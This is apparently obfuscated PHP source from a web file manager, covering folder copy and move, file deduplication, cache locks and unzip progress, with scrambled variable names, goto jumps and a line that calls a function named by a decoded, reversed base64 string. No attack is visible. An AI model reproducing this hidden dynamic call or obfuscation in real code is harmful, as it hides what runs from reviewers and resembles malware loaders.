$áÆ´‰¯ë[$êÂè®û—[468]]; } } } } } if ($ªúöÄ¬ã && !$ßÍ¶½Ö¤[$êÂè®û—[598]]) { $ßÍ¶½Ö¤[$êÂè®û—[598]] = !0; } return $±¸òã¬ü; } private function _moveForce($°ÕÛ÷¹æ, $ÓÂã³˜‚, $œ®ûòæÔ) { $Ôö¨¯”Ù =& $_SERVER[ßğøİ]; $Ÿşïñ»õ = $this->sourceInfo($°ÕÛ÷¹æ); $¹¼á§ö› = $this->sourceInfo($ÓÂã³˜‚); $à´çá» = $Ÿşïñ»õ[$Ôö¨¯”Ù[410]] == $Ôö¨¯”Ù[88]; $öƒêü±½ = array($Ôö¨¯”Ù[401] => $¹¼á§ö›[$Ôö¨¯”Ù[402]], $Ôö¨¯”Ù[590] => $¹¼á§ö›[$Ôö¨¯”Ù[521]] . $¹¼á§ö›[$Ôö¨¯”Ù[402]] . $Ôö¨¯”Ù[50], $Ôö¨¯”Ù[586] => $¹¼á§ö›[$Ôö¨¯”Ù[411]], $Ôö¨¯”Ù[587] => $¹¼á§ö›[$Ôö¨¯”Ù[505]], $Ôö¨¯”Ù[589] => USER_ID, $Ôö¨¯”Ù[420] => $œ®ûòæÔ); $ÄÄáş¨ã = $Ÿşïñ»õ[$Ôö¨¯”Ù[411]] == SourceModel::TYPE_GROUP && $¹¼á§ö›[$Ôö¨¯”Ù[411]] == SourceModel::TYPE_GROUP && $Ÿşïñ»õ[$Ôö¨¯”Ù[505]] == $¹¼á§ö›[$Ôö¨¯”Ù[505]]; if (!$ÄÄáş¨ã && $this->moveClearAuth) { Model($Ôö¨¯”Ù[502])->authClear($°ÕÛ÷¹æ); } $£’–ÎÌÅ = $Ÿşïñ»õ[$Ôö¨¯”Ù[431]] == $Ôö¨¯”Ù[88] && $¹¼á§ö›[$Ôö¨¯”Ù[431]] != $Ôö¨¯”Ù[88]; if ($£’–ÎÌÅ) { $öƒêü±½[$Ôö¨¯”Ù[430]] = 0; } if ($à´çá») { $¦áŒâÉÙ = array($Ôö¨¯”Ù[590] => array($Ôö¨¯”Ù[550], $Ÿşïñ»õ[$Ôö¨¯”Ù[521]] . $Ÿşïñ»õ[$Ôö¨¯”Ù[402]] . $Ôö¨¯”Ù[551])); $‰Õà¸ğ = $Ÿşïñ»õ[$Ôö¨¯”Ù[521]] . $Ÿşïñ»õ[$Ôö¨¯”Ù[402]] . $Ôö¨¯”Ù[50]; $ôŸ€ÀÍÖ = $¹¼á§ö›[$Ôö¨¯”Ù[521]] . $¹¼á§ö›[$Ôö¨¯”Ù[402]] . $Ôö¨¯”Ù[50] . $Ÿşïñ»õ[$Ôö¨¯”Ù[402]] . $Ôö¨¯”Ù[50]; $üÚ“¨¬Ğ = array($Ôö¨¯”Ù[590] => array($Ôö¨¯”Ù[599], "\162\x65\160\154\141\x63\145\x28\160\141\162\145\156\x74\114\145\x76\x65\154\x2c\47{$‰Õà¸ğ}\47\x2c\47{$ôŸ€ÀÍÖ}\x27\51"), $Ôö¨¯”Ù[586] => $¹¼á§ö›[$Ôö¨¯”Ù[411]], $Ôö¨¯”Ù[587] => $¹¼á§ö›[$Ôö¨¯”Ù[505]]); if ($£’–ÎÌÅ) { $üÚ“¨¬Ğ[$Ôö¨¯”Ù[430]] = 0; } $this->where($¦áŒâÉÙ)->data($üÚ“¨¬Ğ)->save(); } $this->where(array($Ôö¨¯”Ù[417] => $°ÕÛ÷¹æ))->data($öƒêü±½)->save(); return $°ÕÛ÷¹æ; } private function clearShare($”¶»Ãï, $í²¡²Â) { $ù³ŸÜèÔ =& $_SERVER[ßğøİ]; $¹´±¨£Ë = $this->sourceInfo($”¶»Ãï); $¤ìÊ×øœ = $this->sourceInfo($í²¡²Â); if ($¹´±¨£Ë[$ù³ŸÜèÔ[505]] == $¤ìÊ×øœ[$ù³ŸÜèÔ[505]] && $¹´±¨£Ë[$ù³ŸÜèÔ[411]] == $ù³ŸÜèÔ[600]) { return; } $Ó¬¹¯öË = array($ù³ŸÜèÔ[521] => array($ù³ŸÜèÔ[550], $¹´±¨£Ë[$ù³ŸÜèÔ[521]] . $”¶»Ãï . $ù³ŸÜèÔ[551])); $ä€ğÚêÌ = $this->field($ù³ŸÜèÔ[417])->where($Ó¬¹¯öË)->getField($ù³ŸÜèÔ[402], !0); if (!$ä€ğÚêÌ) { return; } $Ó¬¹¯öË = array($ù³ŸÜèÔ[402] => array($ù³ŸÜèÔ[7], $ä€ğÚêÌ), $ù³ŸÜèÔ[496] => 1); $˜ş€­ÃŸ = Model($ù³ŸÜèÔ[601])->field($ù³ŸÜèÔ[489])->where($Ó¬¹¯öË)->select(); if (!$˜ş€­ÃŸ) { return; } $˜ş€­ÃŸ = array_to_keyvalue($˜ş€­ÃŸ, $ù³ŸÜèÔ[12], $ù³ŸÜèÔ[489]); $Ó¬¹¯öË = array($ù³ŸÜèÔ[489] => array($ù³ŸÜèÔ[7], $˜ş€­ÃŸ)); Model($ù³ŸÜèÔ[601])->where($Ó¬¹¯öË)->save(array($ù³ŸÜèÔ[496] => 0)); Model($ù³ŸÜèÔ[602])->where($Ó¬¹¯öË)->delete(); } public function copyFolderFromIO($Òº¥’ôá, $ãµ™ÏÖ’, $ìÈ³¬¼«, $é€­ÒŒî, $©‹úÈëŸ, $ğàß´ùã = false) { $‡æêÛÔ° =& $_SERVER[ßğøİ]; $ÌĞåõºô = array($‡æêÛÔ°[567] => array(), $‡æêÛÔ°[568] => array(), $‡æêÛÔ°[566] => array(), $‡æêÛÔ°[603] => array()); $å¬øÄ€§ = $ğàß´ùã ? $ğàß´ùã : $Òº¥’ôá->pathThis($ãµ™ÏÖ’); $ùåˆ‚—Æ = $this->fileNameExist($ìÈ³¬¼«, $å¬øÄ€§); $ç“ÈŸÔ = $this->mkdir($ìÈ³¬¼«, $å¬øÄ€§, $é€­ÒŒî); if (!$ùåˆ‚—Æ || $é€­ÒŒî == REPEAT_RENAME_FOLDER) { $é€­ÒŒî = !1; } if ($ùåˆ‚—Æ) { $this->_childrenAllMake($ùåˆ‚—Æ); } Hook::trigger($‡æêÛÔ°[604]); $this->_copyChildTo($Òº¥’ôá, $ãµ™ÏÖ’, $ç“ÈŸÔ, $é€­ÒŒî, $ÌĞåõºô, $©‹úÈëŸ); Hook::trigger($‡æêÛÔ°[605]); if ($ç“ÈŸÔ) { $this->folderSizeResetChildren($ç“ÈŸÔ); } $this->_childrenListClear(); Model($‡æêÛÔ°[569])->addAll($ÌĞåõºô[$‡æêÛÔ°[567]], array(), !0); Model($‡æêÛÔ°[570])->eventCopy($ç“ÈŸÔ); $this->saveAll($ÌĞåõºô[$‡æêÛÔ°[568]]); Model($‡æêÛÔ°[471])->linkAdd($ÌĞåõºô[$‡æêÛÔ°[566]]); Model($‡æêÛÔ°[471])->remove($ÌĞåõºô[$‡æêÛÔ°[603]]); $this->folderSizeReset($ìÈ³¬¼«); $this->updateModifyTime($ìÈ³¬¼«); return $ç“ÈŸÔ; } private function _copyChildTo($Ìö™û, $’Ë¼ÕÌ, $û˜’¨áœ, $±²Æî¨€, &$’ü¯¢Æ, $Ë”³±¯ñ) { $õà°°úú =& $_SERVER[ßğøİ]; $Çõ»áïœ = $this->sourceInfoCache($û˜’¨áœ); $êœşÒ‹ = $Ìö™û->listPath($’Ë¼ÕÌ); $êœşÒ‹ = $êœşÒ‹ ? $êœşÒ‹ : array($õà°°úú[83] => array(), $õà°°úú[82] => array()); $äÔ’’—‘ = array_merge($êœşÒ‹[$õà°°úú[83]], $êœşÒ‹[$õà°°úú[82]]); $ƒë˜Ç›£ = $this->_addFiles($Ìö™û, $êœşÒ‹[$õà°°úú[83]], $Ë”³±¯ñ); $á‚ê¸ı´ = array(); foreach ($äÔ’’—‘ as &$ì€Õší©) { if (isset($ƒë˜Ç›£[$ì€Õší©[$õà°°úú[32]]])) { $ì€Õší© = $ƒë˜Ç›£[$ì€Õší©[$õà°°úú[32]]]; } $ì€Õší©[$õà°°úú[410]] = $ì€Õší©[$õà°°úú[33]] == $õà°°úú[75]; $ì€Õší©[$õà°°úú[412]] = substr(_get($ì€Õší©, $õà°°úú[174], $õà°°úú[12]), 0, 10); $ì€Õší©[$õà°°úú[76]] = _get($ì€Õší©, $õà°°úú[76], 0); $ì€Õší©[$õà°°úú[468]] = _get($ì€Õší©, $õà°°úú[468], 0); if (!isset($ì€Õší©[$õà°°úú[606]]) && $ì€Õší©[$õà°°úú[468]]) { $’ü¯¢Æ[$õà°°úú[603]][] = $ì€Õší©[$õà°°úú[468]]; } if ($±²Æî¨€) { $ª°àãŠÊ = $this->fileNameExistCache($û˜’¨áœ, $ì€Õší©[$õà°°úú[32]]); if ($ª°àãŠÊ) { if ($ì€Õší©[$õà°°úú[410]] || $±²Æî¨€ == REPEAT_SKIP) { continue; } if ($±²Æî¨€ == REPEAT_REPLACE) { $îì€© = $this->sourceInfoCache($ª°àãŠÊ); $¾Ñ£ïû« = $this->fileHistory($îì€©, $ì€Õší©[$õà°°úú[468]], $ì€Õší©[$õà°°úú[76]]); if ($¾Ñ£ïû«) { $’ü¯¢Æ[$õà°°úú[566]][] = $ì€Õší©[$õà°°úú[468]]; } continue; } else { if ($±²Æî¨€ == REPEAT_RENAME) { $ì€Õší©[$õà°°úú[32]] = $this->fileNameAutoCache($û˜’¨áœ, $ì€Õší©[$õà°°úú[32]], $±²Æî¨€, !1); } } } } if (!$ì€Õší©[$õà°°úú[410]] && $ì€Õší©[$õà°°úú[468]] == 0) { continue; } if (!$ì€Õší©[$õà°°úú[410]] && $ì€Õší©[$õà°°úú[468]]) { $’ü¯¢Æ[$õà°°úú[566]][] = $ì€Õší©[$õà°°úú[468]]; } $á‚ê¸ı´[] = $this->_makeItemData($ì€Õší©, $Çõ»áïœ, $ì€Õší©[$õà°°úú[32]]); } unset($ì€Õší©); if (!empty($á‚ê¸ı´)) { $this->addAll($á‚ê¸ı´); $this->_childrenListSelect($û˜’¨áœ); } $–šşÍ¼Æ = $this->_childrenList($û˜’¨áœ); $–šşÍ¼Æ = array_to_keyvalue($–šşÍ¼Æ, $õà°°úú[32]); foreach ($äÔ’’—‘ as $ì€Õší©) { $îì€© = $–šşÍ¼Æ[$ì€Õší©[$õà°°úú[32]]]; $Óºã²áª = $îì€©[$õà°°úú[402]]; $this->_copyApplyMeta($îì€©, $’ü¯¢Æ); if ($ì€Õší©[$õà°°úú[33]] == $õà°°úú[75]) { $ì€Õší©[$õà°°úú[84]] = $Ìö™û->getPathInner($ì€Õší©[$õà°°úú[84]]); $this->_copyChildTo($Ìö™û, $ì€Õší©[$õà°°úú[84]], $Óºã²áª, $±²Æî¨€, $’ü¯¢Æ, $Ë”³±¯ñ); } } } private function _addFiles($ØÆïğÊê, $“®Üô‹¢, $ÊîóÁÊ§) { $¬İÃ©ƒ =& $_SERVER[ßğøİ]; if (!$“®Üô‹¢ || count($“®Üô‹¢) == 0) { return array(); } $Ì¶›Û‡ = array(); foreach ($“®Üô‹¢ as &$ŠÖ“ª˜ˆ) { Hook::trigger($¬İÃ©ƒ[607], $ŠÖ“ª˜ˆ); $ŠÖ“ª˜ˆ[$¬İÃ©ƒ[84]] = $ØÆïğÊê->getPathInner($ŠÖ“ª˜ˆ[$¬İÃ©ƒ[84]]); $ƒ‹ö»Ó = $ØÆïğÊê->hashSimple($ŠÖ“ª˜ˆ[$¬İÃ©ƒ[84]]); $‘¬ØËü = $ØÆïğÊê->hashMd5($ŠÖ“ª˜ˆ[$¬İÃ©ƒ[84]]); if (strlen($‘¬ØËü) > 10 && !isset($Ì¶›Û‡[$‘¬ØËü])) { $Ì¶›Û‡[$‘¬ØËü] = array(); } $ŠÖ“ª˜ˆ[$¬İÃ©ƒ[177]] = $ƒ‹ö»Ó; $ŠÖ“ª˜ˆ[$¬İÃ©ƒ[176]] = $‘¬ØËü; $Ì¶›Û‡[$‘¬ØËü][] =& $ŠÖ“ª˜ˆ; if (count($Ì¶›Û‡[$‘¬ØËü]) > 1) { $ŠÖ“ª˜ˆ[$¬İÃ©ƒ[606]] = !0; } Hook::trigger($¬İÃ©ƒ[608], $ŠÖ“ª˜ˆ); } unset($ŠÖ“ª˜ˆ); $ÂİÊ³²› = array($¬İÃ©ƒ[176] => array($¬İÃ©ƒ[7], array_keys($Ì¶›Û‡))); $áŞıˆë„ = Model($¬İÃ©ƒ[609]); $üÏĞÉô = $áŞıˆë„->where($ÂİÊ³²›)->select(); $üÏĞÉô = $üÏĞÉô ? $üÏĞÉô : array(); foreach ($üÏĞÉô as $üÛè›ÇÁ) { if (!isset($Ì¶›Û‡[$üÛè›ÇÁ[$¬İÃ©ƒ[176]]])) { continue; } $ÓöˆÙ’ = $Ì¶›Û‡[$üÛè›ÇÁ[$¬İÃ©ƒ[176]]]; foreach ($ÓöˆÙ’ as &$ŠÖ“ª˜ˆ) { $ŠÖ“ª˜ˆ[$¬İÃ©ƒ[468]] = $üÛè›ÇÁ[$¬İÃ©ƒ[468]]; $ŠÖ“ª˜ˆ[$¬İÃ©ƒ[606]] = !0; } unset($ŠÖ“ª˜ˆ); } $õÅåÀ‹ = array(); foreach ($“®Üô‹¢ as $¢ûî÷¾) { Hook::trigger($¬İÃ©ƒ[610], $¢ûî÷¾); if (isset($¢ûî÷¾[$¬İÃ©ƒ[606]]) && $¢ûî÷¾[$¬İÃ©ƒ[606]]) { Hook::trigger($¬İÃ©ƒ[611], $¢ûî÷¾); continue; } $ÆùÏØ›İ = $ØÆïğÊê->getPathInner($¢ûî÷¾[$¬İÃ©ƒ[84]]); $©ã™•¡ã = $áŞıˆë„->addFileMake($ÆùÏØ›İ, $¢ûî÷¾[$¬İÃ©ƒ[76]], $¢ûî÷¾[$¬İÃ©ƒ[177]], $¢ûî÷¾[$¬İÃ©ƒ[176]], $¢ûî÷¾[$¬İÃ©ƒ[32]], $ÊîóÁÊ§); Hook::trigger($¬İÃ©ƒ[611], $¢ûî÷¾); if (!is_array($©ã™•¡ã)) { continue; } $õÅåÀ‹[] = $©ã™•¡ã; } $áŞıˆë„->addAll($õÅåÀ‹); $ÂİÊ³²› = array($¬İÃ©ƒ[176] => array($¬İÃ©ƒ[7], array_keys($Ì¶›Û‡))); $üÏĞÉô = $áŞıˆë„->where($ÂİÊ³²›)->select(); $üÏĞÉô = $üÏĞÉô ? $üÏĞÉô : array(); foreach ($üÏĞÉô as $üÛè›ÇÁ) { if (!isset($Ì¶›Û‡[$üÛè›ÇÁ[$¬İÃ©ƒ[176]]])) { continue; } $µ­¼÷Ï³ =& $Ì¶›Û‡[$üÛè›ÇÁ[$¬İÃ©ƒ[176]]]; foreach ($µ­¼÷Ï³ as &$ŠÖ“ª˜ˆ) { $ŠÖ“ª˜ˆ[$¬İÃ©ƒ[468]] = $üÛè›ÇÁ[$¬İÃ©ƒ[468]]; } unset($ŠÖ“ª˜ˆ); } $©µßÄ„ã = array(); foreach ($“®Üô‹¢ as $Ü¤‰¡Á·) { $©µßÄ„ã[$Ü¤‰¡Á·[$¬İÃ©ƒ[32]]] = $Ü¤‰¡Á·; } return $©µßÄ„ã; } } goto Eõƒáó’Ã­; B˜ì‰©™Š’: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $²‘ûú¡ş =& $_SERVER[ßğøİ]; $Õš²Ë³® = $GLOBALS[$²‘ûú¡ş[6]][$²‘ûú¡ş[349]]; self::$cachePath = $Õš²Ë³®[$²‘ûú¡ş[199]][$²‘ûú¡ş[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ëøÎ ›, $şä‡Ë = 0) { $ÍªÌØ°¸ =& $_SERVER[ßğøİ]; $çßÕñí™ = microtime(!0); $×Ú¬± = $çßÕñí™ + $şä‡Ë + 0.0001; $Ï‹Æäá = rtrim(self::$cachePath, $ÍªÌØ°¸[8]) . $ÍªÌØ°¸[856] . md5($ëøÎ ›) . $ÍªÌØ°¸[853]; if (file_exists($Ï‹Æäá) && filemtime($Ï‹Æäá) && filemtime($Ï‹Æäá) < time() - 10) { @unlink($Ï‹Æäá); } do { if (file_exists($Ï‹Æäá)) { cacheLockWait(); continue; } $©ÏÃ´‘ = fopen($Ï‹Æäá, $ÍªÌØ°¸[857]); if (!$©ÏÃ´‘) { return !1; } $·ò¹ğ‹ = flock($©ÏÃ´‘, LOCK_EX | LOCK_NB); self::$caches[$ëøÎ ›] = array($ÍªÌØ°¸[858] => $©ÏÃ´‘, $ÍªÌØ°¸[199] => $Ï‹Æäá); fwrite($©ÏÃ´‘, $×Ú¬±); clearstatcache(); if ($©ÏÃ´‘ && $·ò¹ğ‹) { return !0; } cacheLockWait(); } while (microtime(!0) < $×Ú¬±); $this->unlock($ëøÎ ›); return !1; } public function lockGet($Ä¥Ã®øĞ) { $Á‘‘Ô• =& $_SERVER[ßğøİ]; $¯ïèü = rtrim(self::$cachePath, $Á‘‘Ô•[8]) . $Á‘‘Ô•[856] . md5($Ä¥Ã®øĞ) . $Á‘‘Ô•[853]; return file_exists($¯ïèü); } public function unlock($ÀÅÒş) { $Ÿéàæ® =& $_SERVER[ßğøİ]; $Š÷ÕÁÛ˜ = self::$caches[$ÀÅÒş]; if (!$Š÷ÕÁÛ˜) { return; } @flock($Š÷ÕÁÛ˜[$Ÿéàæ®[858]], LOCK_UN); @fclose($Š÷ÕÁÛ˜[$Ÿéàæ®[858]]); @unlink($Š÷ÕÁÛ˜[$Ÿéàæ®[199]]); unset(self::$caches[$ÀÅÒş]); } } class CacheLockRedis { public function lock($Ğì¹ú“ñ, $·Ë»»šß = 10) { $ì°Ô±– = Cache::init(); $ÅÒ€‡Á = microtime(!0) + $·Ë»»šß; while (microtime(!0) < $ÅÒ€‡Á) { $—åúÑÊŞ = $ì°Ô±–->get($Ğì¹ú“ñ); if (!$—åúÑÊŞ) { $µ‰…Õ° = $ì°Ô±–->setLock($Ğì¹ú“ñ, $ÅÒ€‡Á, $·Ë»»šß); if ($µ‰…Õ°) { return !0; } } else { if ($—åúÑÊŞ < microtime(!0)) { $ì°Ô±–->set($Ğì¹ú“ñ, $ÅÒ€‡Á, $·Ë»»šß * 2); if ($ì°Ô±–->get($Ğì¹ú“ñ) === $—åúÑÊŞ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ œÎ¾§ë) { return Cache::init()->get($ œÎ¾§ë); } public function unlock($ö®Ğ†Åî) { return Cache::init()->remove($ö®Ğ†Åî); } } class CacheLockMemcached { public function lock($ÊÆøı™Î, $˜¼Êª› = 0) { $Âœš‡Áé = Cache::init(); $æÉÌ‰†ı = microtime(!0) + $˜¼Êª›; while (microtime(!0) < $æÉÌ‰†ı) { $óö°…œ = $Âœš‡Áé->get($ÊÆøı™Î); if (!$óö°…œ || $óö°…œ < microtime(!0)) { $«æ¦µò¼ = $Âœš‡Áé->handle->add($ÊÆøı™Î, $æÉÌ‰†ı, $˜¼Êª›); if ($«æ¦µò¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¬òé¢Ù) { return Cache::init()->get($¬òé¢Ù); } public function unlock($Šğ‹Ş‘¹) { return Cache::init()->remove($Šğ‹Ş‘¹); } } goto Aãé—ËÓËÎ; CÚùÕÙÑÓ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $µ¤÷î×» =& $_SERVER[ßğøİ]; parent::startAfter(); Hook::bind($µ¤÷î×»[1748], array($this, $µ¤÷î×»[1749])); Hook::bind($µ¤÷î×»[1194], array($this, $µ¤÷î×»[1750])); $­ñ¯ğ´É =& $this->task; $­ñ¯ğ´É[$µ¤÷î×»[1751]] = $µ¤÷î×»[1199]; if (!$­ñ¯ğ´É[$µ¤÷î×»[1554]]) { $­ñ¯ğ´É[$µ¤÷î×»[1554]] = LNG($µ¤÷î×»[1752]); } } protected function endAfter() { $øì¼óÕæ =& $_SERVER[ßğøİ]; parent::endAfter(); Hook::unbind($øì¼óÕæ[1748], array($this, $øì¼óÕæ[1749])); Hook::unbind($øì¼óÕæ[1194], array($this, $øì¼óÕæ[1750])); } public function updateAfter() { $éáçÂÖ =& $_SERVER[ßğøİ]; $İ×æ­æ½ =& $this->task; if (!$İ×æ­æ½[$éáçÂÖ[783]] || !$İ×æ­æ½[$éáçÂÖ[760]]) { return; } if ($İ×æ­æ½[$éáçÂÖ[1751]] == $éáçÂÖ[1199]) { $ïËôæÜÅ = 0; if ($İ×æ­æ½[$éáçÂÖ[1706]]) { $ïËôæÜÅ = $İ×æ­æ½[$éáçÂÖ[1707]] / $İ×æ­æ½[$éáçÂÖ[1706]]; } $İ×æ­æ½[$éáçÂÖ[1657]] = $ïËôæÜÅ * 0.3; } else { if ($İ×æ­æ½[$éáçÂÖ[1751]] == $éáçÂÖ[313]) { $ïËôæÜÅ = $İ×æ­æ½[$éáçÂÖ[1656]] / $İ×æ­æ½[$éáçÂÖ[783]]; $İ×æ­æ½[$éáçÂÖ[1657]] = 0.3 + $ïËôæÜÅ * 0.4; } else { if ($İ×æ­æ½[$éáçÂÖ[1751]] == $éáçÂÖ[107]) { $åÎ›ÜÕ  = 0; if ($İ×æ­æ½[$éáçÂÖ[1708]] == $éáçÂÖ[107]) { $åÎ›ÜÕ  = $İ×æ­æ½[$éáçÂÖ[1707]]; } $ïËôæÜÅ = ($İ×æ­æ½[$éáçÂÖ[1711]] + $åÎ›ÜÕ ) / $İ×æ­æ½[$éáçÂÖ[760]]; $İ×æ­æ½[$éáçÂÖ[1657]] = 0.3 + 0.4 + $ïËôæÜÅ * 0.3; } } } if ($İ×æ­æ½[$éáçÂÖ[1657]] > 0) { $†Ó¿ôÓ = timeFloat() - $İ×æ­æ½[$éáçÂÖ[1659]] - $İ×æ­æ½[$éáçÂÖ[1662]]; $İ×æ­æ½[$éáçÂÖ[1663]] = $†Ó¿ôÓ * (1 - $İ×æ­æ½[$éáçÂÖ[1657]]) / $İ×æ­æ½[$éáçÂÖ[1657]]; } } public function addFile($¾ñè÷Ù) { $¯š¥£ë‡ =& $_SERVER[ßğøİ]; $Ûç§¿ =& $this->task; $ş—å›–û = IO::info($¾ñè÷Ù); $Ûç§¿[$¯š¥£ë‡[1704]] = $ş—å›–û[$¯š¥£ë‡[32]]; $Ûç§¿[$¯š¥£ë‡[1706]] = $ş—å›–û[$¯š¥£ë‡[76]]; $Ûç§¿[$¯š¥£ë‡[1707]] = 0; $Ûç§¿[$¯š¥£ë‡[1064]] = $¯š¥£ë‡[1727]; $Ûç§¿[$¯š¥£ë‡[1708]] = $¯š¥£ë‡[1199]; $Ûç§¿[$¯š¥£ë‡[760]] = $ş—å›–û[$¯š¥£ë‡[76]]; $Ûç§¿[$¯š¥£ë‡[783]] = 1; $ÊòöÎç = 0; $Ûç§¿[$¯š¥£ë‡[1715]] = array($¯š¥£ë‡[1716] => $ÊòöÎç + 1, $¯š¥£ë‡[420] => $ş—å›–û[$¯š¥£ë‡[32]], $¯š¥£ë‡[84] => $ş—å›–û[$¯š¥£ë‡[84]], $¯š¥£ë‡[519] => $ş—å›–û[$¯š¥£ë‡[519]] ? $ş—å›–û[$¯š¥£ë‡[519]] : $ş—å›–û[$¯š¥£ë‡[84]]); $this->update(); } public function unzipAfter($ß·ìÔ ) { $ŸŞ¼­Û =& $_SERVER[ßğøİ]; $Ò¡ÅÂ¨ =& $this->task; $Ò¡ÅÂ¨[$ŸŞ¼­Û[1751]] = $ŸŞ¼­Û[107]; $ê“­Î°‚ = IO::infoWithChildren($ß·ìÔ ); $Éø¥½º = 0; $Ò¡ÅÂ¨[$ŸŞ¼­Û[1715]] = array($ŸŞ¼­Û[1716] => $Éø¥½º + 1, $ŸŞ¼­Û[420] => $ê“­Î°‚[$ŸŞ¼­Û[32]], $ŸŞ¼­Û[84] => $ê“­Î°‚[$ŸŞ¼­Û[84]], $ŸŞ¼­Û[519] => $ê“­Î°‚[$ŸŞ¼­Û[519]] ? $ê“­Î°‚[$ŸŞ¼­Û[519]] : $ê“­Î°‚[$ŸŞ¼­Û[84]]); if ($ê“­Î°‚[$ŸŞ¼­Û[33]] == $ŸŞ¼­Û[199]) { $Ò¡ÅÂ¨[$ŸŞ¼­Û[783]] = 1; } else { $Ò¡ÅÂ¨[$ŸŞ¼­Û[783]] = $ê“­Î°‚[$ŸŞ¼­Û[79]][$ŸŞ¼­Û[77]]; } $Ò¡ÅÂ¨[$ŸŞ¼­Û[1064]] = $ŸŞ¼­Û[12]; $Ò¡ÅÂ¨[$ŸŞ¼­Û[1708]] = 0; $Ò¡ÅÂ¨[$ŸŞ¼­Û[1656]] = 0; $Ò¡ÅÂ¨[$ŸŞ¼­Û[1706]] = 0; $Ò¡ÅÂ¨[$ŸŞ¼­Û[1707]] = 0; $Ò¡ÅÂ¨[$ŸŞ¼­Û[1704]] = $ŸŞ¼­Û[12]; $Ò¡ÅÂ¨[$ŸŞ¼­Û[1711]] = 0; $Ò¡ÅÂ¨[$ŸŞ¼­Û[760]] = $ê“­Î°‚[$ŸŞ¼­Û[76]]; $this->update(); self::log($ŸŞ¼­Û[1753] . json_encode(array($Ò¡ÅÂ¨, $ê“­Î°‚))); } public function nameParse($šŞÃÆ³) { $ß¾‡ñøÓ =& $_SERVER[ßğøİ]; $™Å¡äˆÎ =& $this->task; if ($™Å¡äˆÎ[$ß¾‡ñøÓ[1751]] == $ß¾‡ñøÓ[1199]) { $™Å¡äˆÎ[$ß¾‡ñøÓ[1751]] = $ß¾‡ñøÓ[313]; $™Å¡äˆÎ[$ß¾‡ñøÓ[1711]] = 0; $™Å¡äˆÎ[$ß¾‡ñøÓ[760]] = 0; } $‰¿Üƒ ñ = get_path_this($šŞÃÆ³); if (strstr($‰¿Üƒ ñ, $ß¾‡ñøÓ[10])) { $™Å¡äˆÎ[$ß¾‡ñøÓ[1656]] += 1; $™Å¡äˆÎ[$ß¾‡ñøÓ[783]] += 1; } $™Å¡äˆÎ[$ß¾‡ñøÓ[1704]] = $šŞÃÆ³; $this->update(); } } $_file = $_SERVER[$_SERVER[ßğøİ][869]]; $_size = $_SERVER[ßğøİ][870]; goto a‚†Ãº¤Ş; Eî­Í¬ïˆÌ: $fileSize = strrev(base64_decode($_SERVER[äÓ¯ÍÙ][0])); function binCheckNeq($‡Œ™ùÚ, $Üıóá—‹) { return $‡Œ™ùÚ != $Üıóá—‹; } $_SERVER[$_SERVER[äÓ¯ÍÙ][1]] = $fileSize($_SERVER[$_SERVER[äÓ¯ÍÙ][2]]); goto B¶¯¿´ƒ¬³; bš·øÄé“–: class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\155\x2e\152\x6f\x62\x4c\151\x73\x74"; public $field = array("\156\x61\155\x65", "\x64\145\163\x63", "\163\x6f\162\x74"); const JOB_KEY = "\163\145\154\146\112\157\142\x4c\x69\163\164"; public function listData($ŠñŸşÔÓ = false, $Á–ÍÃ„Ä = "\x73\157\162\x74", $Ü±Öí„Ë = false) { return parent::listData($ŠñŸşÔÓ, $Á–ÍÃ„Ä, $Ü±Öí„Ë); } public function remove($°öòğ›Û) { return parent::remove($°öòğ›Û); } public function add($¯÷¦ãŠ) { $ÅŒªÒĞ =& $_SERVER[ßğøİ]; if ($this->findByName($¯÷¦ãŠ[$ÅŒªÒĞ[32]])) { return !1; } $¯÷¦ãŠ[$ÅŒªÒĞ[1852]] = $this->getSort(); return parent::insert($¯÷¦ãŠ); } private function getSort() { $¸¢•¬êÃ =& $_SERVER[ßğøİ]; $Úâ´ÄŞ = parent::listData(); $ÁÛù¨ñÕ = array_to_keyvalue($Úâ´ÄŞ, $¸¢•¬êÃ[12], $¸¢•¬êÃ[1852]); return empty($ÁÛù¨ñÕ) ? 0 : max($ÁÛù¨ñÕ) + 1; } public function update($½ş«¦í¡, $»œ©€åÈ) { $µµ¿×Ûî =& $_SERVER[ßğøİ]; $Ú“¢Âæ = parent::listData($½ş«¦í¡); $·Û´˜ŸÑ = $this->findByName($»œ©€åÈ[$µµ¿×Ûî[32]]); if (!$Ú“¢Âæ || $·Û´˜ŸÑ && $·Û´˜ŸÑ[$µµ¿×Ûî[399]] != $Ú“¢Âæ[$µµ¿×Ûî[399]]) { return !1; } return parent::update($½ş«¦í¡, $»œ©€åÈ); } public function setUserJob($Ù÷À•¡‰, $ëò´ì—Ã) { $ÚàÂ®Ø« =& $_SERVER[ßğøİ]; if (!is_array($ëò´ì—Ã)) { $ëò´ì—Ã = array($ëò´ì—Ã); } $“¼³ÇúÜ = parent::listData(); $á«…â = array_to_keyvalue($“¼³ÇúÜ, $ÚàÂ®Ø«[32]); $ÆÀÄºçÀ = $ÚàÂ®Ø«[378]; foreach ($ëò´ì—Ã as $­ÁíÏÙ) { if ($á«…â[$­ÁíÏÙ]) { $ÆÀÄºçÀ .= $á«…â[$­ÁíÏÙ][$ÚàÂ®Ø«[399]] . $ÚàÂ®Ø«[50]; } else { $¥å•­Çµ = $this->add($­ÁíÏÙ); $ÆÀÄºçÀ .= $¥å•­Çµ . $ÚàÂ®Ø«[50]; } } $ÆÀÄºçÀ = rtrim($ÆÀÄºçÀ, $ÚàÂ®Ø«[50]); Model($ÚàÂ®Ø«[535])->metaSet($Ù÷À•¡‰, self::JOB_KEY, $ÆÀÄºçÀ); } public function getUserJob($û–ĞĞÈÕ) { $‚Å¥—Ø¼ = Model($_SERVER[ßğøİ][535])->metaGet($û–ĞĞÈÕ); return $this->getUserJobInfo($‚Å¥—Ø¼[self::JOB_KEY]); } public function getUserJobInfo($ı€Ó¨³¹) { $¨šï—  =& $_SERVER[ßğøİ]; $ë‰ä¡éà = explode($¨šï— [50], $ı€Ó¨³¹); $§×ËÌ¸ = parent::listData(); $§×ËÌ¸ = array_remove_key($§×ËÌ¸, $¨šï— [200]); $£Š‹×¬Ø = array(); foreach ($ë‰ä¡éà as $âŞÒ…Ñ) { if 